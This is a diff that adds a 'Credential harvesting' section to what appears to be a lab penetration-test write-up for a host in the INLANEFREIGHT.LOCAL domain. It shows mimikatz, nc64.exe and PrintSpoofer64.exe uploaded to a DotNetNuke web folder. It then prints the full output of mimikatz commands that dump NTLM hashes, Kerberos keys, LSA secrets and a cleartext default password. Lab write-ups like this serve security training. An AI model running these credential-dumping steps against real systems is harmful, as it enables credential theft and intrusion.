@@ -1415,3 +1415,159 @@ K33p_0n_sp00fing!
 c:\Users\Administrator\Desktop>
 
 ```
+
+## Credential harvesting
+
+mimikatz is uploaded on the host with the same technique and is used to dump the registry
+
+```
+Directory of c:\DotNetNuke\Portals\0
+
+11/13/2026  09:50 AM    <DIR>          .
+11/13/2026  09:50 AM    <DIR>          ..
+06/01/2022  12:49 PM             9,569 home.css
+06/01/2022  12:49 PM    <DIR>          Images
+11/13/2026  09:50 AM         1,250,056 mimikatz.exe
+11/13/2026  09:39 AM            45,272 nc64.exe
+11/13/2026  09:39 AM            27,136 PrintSpoofer64.exe
+06/01/2022  12:49 PM    <DIR>          Templates
+06/01/2022  12:51 PM    <DIR>          Users
+               4 File(s)      1,332,033 bytes
+               5 Dir(s)  31,526,572,032 bytes free
+
+c:\DotNetNuke\Portals\0>.\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug 
+Privilege '20' OK
+
+```
+
+```
+mimikatz # lsadump::sam
+Domain : ACADEMY-AEN-DEV
+SysKey : b3a720652a6fca7e31c1659e3d619944
+Local SID : S-1-5-21-4188713075-3040141756-4070027797
+
+SAMKey : 5b291799f8cf904e8b45c8a59a7ece3f
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 0e20798f695ab0d04bc138b22344cea8
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 8e9d2160ace6313fd975f14028afc13c
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 25b7ef9fb0d538b0ea5a5f8e5bb2dd4bd379825373097006085d9e0bc0b4a2bd
+      aes128_hmac       (4096) : e0cec3e285f849ceb9505c2a40933ba2
+      des_cbc_md5       (4096) : df2f7a2002cd9726
+    OldCredentials
+      aes256_hmac       (4096) : 2fb39f6a7cafb3a7d7a1898e322b316fbb782adf881a5158b5ee56a6fb2b0d09
+      aes128_hmac       (4096) : 56576ae9fbfa03a40a9fdeef3a28f300
+      des_cbc_md5       (4096) : 855b6ba2a17a4067
+    OlderCredentials
+      aes256_hmac       (4096) : 23cbc0dad348bebcbdbb4c82e9b23af299e8b56de358bafe24f2235f34497e4a
+      aes128_hmac       (4096) : e35eb565af30c8ed79df5d8875508df6
+      des_cbc_md5       (4096) : 4904021983252cd5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : df2f7a2002cd9726
+    OldCredentials
+      des_cbc_md5       : 855b6ba2a17a4067
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+
+RID  : 000003e9 (1001)
+User : mpalledorous
+  Hash NTLM: 3bb874a52ce7b0d64ee2a82bbf3fe1cc
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : ce7a5171bbe834124da91992ecda68c9
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALmpalledorous
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 6bd17ff49d28241e0c66633b39a4914e5f502f387f8caa873bd11293f539de20
+      aes128_hmac       (4096) : 61352bc0ead58d7ddbb51118c3c4b2a5
+      des_cbc_md5       (4096) : a2a404dcd92375cb
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCALmpalledorous
+    Credentials
+      des_cbc_md5       : a2a404dcd92375cb
+
+
+```
+
+```
+mimikatz # lsadump::secrets
+Domain : ACADEMY-AEN-DEV
+SysKey : b3a720652a6fca7e31c1659e3d619944
+
+Local name : ACADEMY-AEN-DEV ( S-1-5-21-4188713075-3040141756-4070027797 )
+Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
+Domain FQDN : INLANEFREIGHT.LOCAL
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {b9789de7-ed68-1526-12f5-08fc1ad2996f}
+  [00] {b9789de7-ed68-1526-12f5-08fc1ad2996f} c382f753c97d2798f34aa2c43c41ca6fdc8548a17eba53764e79a20550fed730
+
+Secret  : $MACHINE.ACC
+cur/hex : 1b 1e df 99 7b ec 38 e6 95 4c ba 10 ca 20 2f 1c 83 12 e2 27 df 0f b6 a8 d9 31 8e 17 30 c6 2b 01 ed c5 ed c6 4d 73 4c 71 fa 24 3c 85 40 82 bd 50 81 32 9d 54 9b 98 cf d0 db 61 66 b9 d1 e2 02 e5 19 8b e4 58 de 7f c5 05 d2 19 fa 97 5f 47 55 41 53 49 39 de 91 77 78 39 b8 99 b2 de 4b e9 69 a1 1c e0 7e 67 06 94 6d 07 a4 86 ab 0b c3 82 d7 e7 e8 d2 8c 56 f3 1b 49 f5 b3 a0 78 fd e0 62 a8 5c dd f9 56 3c 7b f1 ee 2e bb e1 fd 57 10 40 15 74 53 2d 96 6d 94 71 c1 a1 a7 e4 e5 79 e5 da ec f5 e2 fc ac 75 5d 32 5f e0 72 32 cb 37 90 7e c5 c1 b9 5c 40 a2 44 73 4b 50 f8 51 03 99 dc d4 a2 86 7b 67 7a 57 c4 c0 03 fc d4 88 db a4 ae d4 47 f3 05 a8 92 e0 37 a2 27 6f 51 af d9 61 85 a7 7e 58 17 93 fd 74 14 d4 a2 74 0e b6 0f cf 13 2d 26 ea 
+    NTLM:aea71d223774c11e71f96a6c162cdfba
+    SHA1:5d291faf670ee5e03b0f4aed499a2375ffb15007
+old/text: >& FZ0F!KFq.+MBPHE.l(xyXD;Pay3n*GAY n-9Y;5>w]_KI@QNbWDtk^u@Ia]`ac$f3<a+`93`jbVn>!vJ!4I;!$]Mg!QK.Or)'Lr0Vv'OU;UdaJiu2hT3l
+    NTLM:cb8a6327fc3dad4ea7c84b88c7542e7c
+    SHA1:7a235e5ec5d545d163d6c181383d3f043d4685c2
+
+Secret  : DefaultPassword
+cur/text: Gr8hambino!
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 69 68 d5 0f 5e c2 bc 41 bc 20 7a 35 f0 39 2b 72 bb 08 3c 22 e1 e7 a8 bc 82 73 39 55 52 ae 8e 23 52 9a d8 74 0d 82 ea 92 
+    full: 6968d50f5ec2bc41bc207a35f0392b72bb083c22e1e7a8bc8273395552ae8e23529ad8740d82ea92
+    m/u : 6968d50f5ec2bc41bc207a35f0392b72bb083c22 / e1e7a8bc8273395552ae8e23529ad8740d82ea92
+old/hex : 01 00 00 00 dd 0a a3 03 f4 54 79 25 14 2b a9 35 5e c6 fb fc 73 af 4e 7f 34 43 f6 4e 38 01 81 de 9a 46 4c f4 b0 6d 50 ed 83 97 aa 5f 
+    full: dd0aa303f4547925142ba9355ec6fbfc73af4e7f3443f64e380181de9a464cf4b06d50ed8397aa5f
+    m/u : dd0aa303f4547925142ba9355ec6fbfc73af4e7f / 3443f64e380181de9a464cf4b06d50ed8397aa5f
+
+Secret  : NL$KM
+cur/hex : 21 0c e6 ac 8b 08 9b 39 97 ea d9 c6 77 db 10 e6 2e b2 53 43 7e b8 06 64 b3 eb 89 b1 da d1 22 c7 11 83 fa 35 db 57 3e b0 9d 84 59 41 90 18 7a 8d ed c9 1c 26 ff b7 da 6f 02 c9 2e 18 9d ca 08 2d 
+old/hex : 21 0c e6 ac 8b 08 9b 39 97 ea d9 c6 77 db 10 e6 2e b2 53 43 7e b8 06 64 b3 eb 89 b1 da d1 22 c7 11 83 fa 35 db 57 3e b0 9d 84 59 41 90 18 7a 8d ed c9 1c 26 ff b7 da 6f 02 c9 2e 18 9d ca 08 2d 
+
+Secret  : _SC_MSSQL$SQLEXPRESS / service 'MSSQL$SQLEXPRESS' with username : NT Service\MSSQL$SQLEXPRESS
+
+Secret  : _SC_SQLTELEMETRY$SQLEXPRESS / service 'SQLTELEMETRY$SQLEXPRESS' with username : NT Service\SQLTELEMETRY$SQLEXPRESS
+
+
+```
